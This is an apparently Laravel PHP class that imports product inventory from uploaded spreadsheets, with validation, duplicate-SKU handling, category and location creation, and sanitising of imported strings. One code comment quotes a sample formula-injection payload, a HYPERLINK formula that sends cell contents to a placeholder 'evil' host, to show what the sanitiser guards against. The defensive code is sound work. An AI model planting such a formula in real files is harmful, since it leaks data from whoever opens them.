<?php

declare(strict_types=1);

namespace App\Imports;

use App\Models\Inventory\Product;
use App\Models\Inventory\ProductCategory;
use App\Models\Inventory\ProductLocation;
use App\Support\SpreadsheetSafety;
use Illuminate\Support\Collection;
use Illuminate\Support\Facades\Validator;
use Maatwebsite\Excel\Concerns\SkipsFailures;
use Maatwebsite\Excel\Concerns\SkipsOnFailure;
use Maatwebsite\Excel\Concerns\ToCollection;
use Maatwebsite\Excel\Concerns\WithChunkReading;
use Maatwebsite\Excel\Concerns\WithHeadingRow;

/**
 * Import class for processing product data from Excel files.
 *
 * Handles importing and updating products from spreadsheet data,
 * including automatic creation of categories and locations.
 */
final class ProductsImport implements SkipsOnFailure, ToCollection, WithChunkReading, WithHeadingRow
{
    use SkipsFailures;

    /**
     * The organization ID to import products into.
     *
     * @var int
     */
    protected $organizationId;

    /**
     * Count of newly imported products.
     *
     * @var int
     */
    protected $imported = 0;

    /**
     * Count of updated existing products.
     *
     * @var int
     */
    protected $updated = 0;

    /**
     * Array of errors encountered during import.
     *
     * @var array
     */
    protected $errors = [];

    /**
     * Non-fatal warnings (e.g. duplicate SKUs collapsed within one file).
     *
     * @var array
     */
    protected $warnings = [];

    /**
     * SKUs already processed in this import, to detect intra-file duplicates.
     *
     * @var array<string, true>
     */
    protected $seenSkus = [];

    /**
     * Rows processed so far, so error/warning row numbers stay absolute across
     * chunks (WithChunkReading re-indexes each chunk from 0).
     */
    protected int $rowOffset = 0;

    /**
     * Create a new import instance.
     *
     * @param  int  $organizationId  The organization to import products into
     */
    public function __construct($organizationId)
    {
        $this->organizationId = $organizationId;
    }

    /**
     * Process each row in the collection
     */
    public function collection(Collection $rows)
    {
        foreach ($rows as $index => $row) {
            // Absolute row number across chunks (+2 for the header row and the
            // 0-based index).
            $rowNumber = $this->rowOffset + $index + 2;

            try {
                // Validate the row
                $validator = Validator::make($row->toArray(), [
                    'name' => 'required|string|max:255',
                    'sku' => 'required|string|max:255',
                    'price' => 'required|numeric|min:0',
                    'stock' => 'required|integer|min:0',
                    'min_stock' => 'nullable|integer|min:0',
                ]);

                if ($validator->fails()) {
                    $this->errors[] = [
                        'row' => $rowNumber,
                        'errors' => $validator->errors()->all(),
                    ];

                    continue;
                }

                // Collapse intra-file duplicate SKUs: keep the first occurrence
                // and warn, rather than silently letting a later row overwrite
                // the product created earlier in the same file.
                $sku = (string) $row['sku'];
                if (isset($this->seenSkus[$sku])) {
                    $this->warnings[] = [
                        'row' => $rowNumber,
                        'warnings' => ["Duplicate SKU '{$sku}' in this file — row skipped (first occurrence kept)."],
                    ];

                    continue;
                }
                $this->seenSkus[$sku] = true;

                // Find or create category
                $categoryId = null;
                if (! empty($row['category'])) {
                    $category = ProductCategory::firstOrCreate(
                        [
                            'name' => $row['category'],
                            'organization_id' => $this->organizationId,
                        ]
                    );
                    $categoryId = $category->id;
                }

                // Find or create location. Generate a unique 3-char-derived
                // code so importing "Toronto Main" and later "Toronto Backup"
                // doesn't produce two locations sharing code='TOR'.
                $locationId = null;
                if (! empty($row['location'])) {
                    $location = ProductLocation::firstOrCreate(
                        [
                            'name' => $row['location'],
                            'organization_id' => $this->organizationId,
                        ],
                        [
                            'code' => $this->uniqueLocationCode($row['location']),
                        ]
                    );
                    $locationId = $location->id;
                }

                // Check if product exists (by SKU) — include soft-deleted rows:
                // the SKU unique index counts them, so a plain lookup would miss
                // a trashed product and then collide on create. Restore + update
                // instead.
                $product = Product::withTrashed()
                    ->where('sku', $row['sku'])
                    ->where('organization_id', $this->organizationId)
                    ->first();

                // Convert status string to is_active boolean
                $status = $row['status'] ?? 'active';
                $isActive = strtolower($status) === 'active';

                // Strip leading formula triggers from imported strings so
                // a tenant-uploaded row that says
                //   name = =HYPERLINK("https://evil/?leak="&A2,"safe")
                // doesn't land in the DB and re-export to a downloader
                // whose spreadsheet viewer evaluates it.
                $sanitise = fn ($v) => SpreadsheetSafety::sanitiseImport($v);

                $productData = [
                    'name' => $sanitise($row['name']),
                    'sku' => $sanitise($row['sku']),
                    'barcode' => $sanitise($row['barcode'] ?? null),
                    'description' => $sanitise($row['description'] ?? null),
                    'category_id' => $categoryId,
                    'location_id' => $locationId,
                    'price' => $row['price'],
                    'currency' => $row['currency'] ?? 'USD',
                    'purchase_price' => $row['purchase_price'] ?? null,
                    'stock' => $row['stock'],
                    'min_stock' => $row['min_stock'] ?? 0,
                    'is_active' => $isActive,
                    'notes' => $sanitise($row['notes'] ?? null),
                    'organization_id' => $this->organizationId,
                ];

                if ($product) {
                    // Update existing product, restoring it first if it was
                    // soft-deleted so re-importing a deleted SKU brings it back.
                    if ($product->trashed()) {
                        $product->restore();
                    }
                    $product->update($productData);
                    $this->updated++;
                } else {
                    // Create new product
                    Product::create($productData);
                    $this->imported++;
                }
            } catch (\Exception $e) {
                $this->errors[] = [
                    'row' => $rowNumber,
                    'errors' => [$e->getMessage()],
                ];
            }
        }

        // Advance the absolute-row offset for the next chunk.
        $this->rowOffset += $rows->count();
    }

    /**
     * Read the file in chunks so large uploads don't materialise the whole
     * sheet in memory and OOM the import worker.
     */
    public function chunkSize(): int
    {
        return 500;
    }

    /**
     * Get import statistics
     */
    public function getStats(): array
    {
        return [
            'imported' => $this->imported,
            'updated' => $this->updated,
            'errors' => $this->errors,
            'warnings' => $this->warnings,
        ];
    }

    /**
     * Generate a 3-character-derived location code that does not collide
     * with any existing location code in the same organisation. On
     * collision, append a numeric suffix until a free code is found.
     */
    protected function uniqueLocationCode(string $name): string
    {
        $base = strtoupper(substr($name, 0, 3));
        if ($base === '') {
            $base = 'LOC';
        }

        $code = $base;
        $suffix = 1;
        while (
            ProductLocation::where('organization_id', $this->organizationId)
                ->where('code', $code)
                ->exists()
        ) {
            $suffix++;
            $code = $base.'-'.$suffix;
        }

        return $code;
    }
}
